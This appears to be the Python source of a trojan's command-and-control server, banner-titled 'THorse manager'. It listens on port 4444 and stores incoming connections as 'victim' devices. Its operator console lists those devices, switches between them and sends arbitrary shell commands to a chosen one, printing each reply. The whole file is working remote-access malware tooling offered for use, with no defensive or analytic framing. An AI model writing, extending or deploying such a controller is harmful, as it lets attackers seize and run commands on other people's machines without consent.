import socket
from Utilities.Logging.log import Log
from threading import Thread
import json
import pyfiglet


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('127.0.0.1', 4444))
s.listen()


connections = []
addresses = []

def reliable_send(s,data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv(s):
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
class victim:

    def device(self,args):
        conn = connections[int(args)-1]
        while True:
            try:
                cmd = input(f'shell @{connections.index(conn)+1} # ').strip()
                if cmd == 'home':
                    Log.warning("Switching to home.")
                    break
                reliable_send(conn, cmd)
                print(reliable_recv(conn))
            except Exception:
                pos = connections.index(conn)
                connections.pop(pos)
                Log.info(f"{addresses[pos]} left!")
                addresses.pop(pos)
                break
        
    def devices(self):
        Log.info("Available devices are :")
        for _,i in enumerate(connections):
            print(f'\t[{_}]: {i.raddr}')

    def show(self):
        for i in connections:
            print(i)
        self.home()

    def help(self):
        print('Available commads: ')
        print('\t [1] devices -> displays all the available devices.')
        print('\t [2] home ->switch to home panel.')
        print('\t [3] device [N] ->switch to Nth connection.')
        self.home()
        

    def process(self,cmd):
        line = cmd.split()
        try:
            cmd = line[0]
            args = line[1:]
            func = getattr(self, cmd, None)
            if func:
                try:
                    func(*args)
                except Exception as e:
                    Log.error(f"Error: {e}")
            else:
                Log.error("No such command.")
        except Exception as e:
            # print('error ignored')
            print("",end='')
        self.home()


    def home(self):
        cmd = input("home > ")
        self.process(cmd)

def start():
    while True:
        try:
            conn, addr = s.accept()
            Log.success(f"conneted with {addr}")
            connections.append(conn)
            addresses.append(addr)  
            # t = Thread(target = obj.home)
            # t.start()
            # obj.home()
        except Exception:
            break   

if __name__ == "__main__":
    # if len(sys.argv) != 3:
    #     print ("Usage : ")
    #     print ("\tpython master.py [HOST] [PORT]")
    #     exit(1)
    Log.success(f"Server started at {socket.gethostbyname(socket.gethostname())}:4444")
    Log.success(pyfiglet.figlet_format('THorse manager'))
    obj = victim()
    t = Thread(target =start)
    t.start()
    t1 = Thread(target = obj.home)
    t1.start()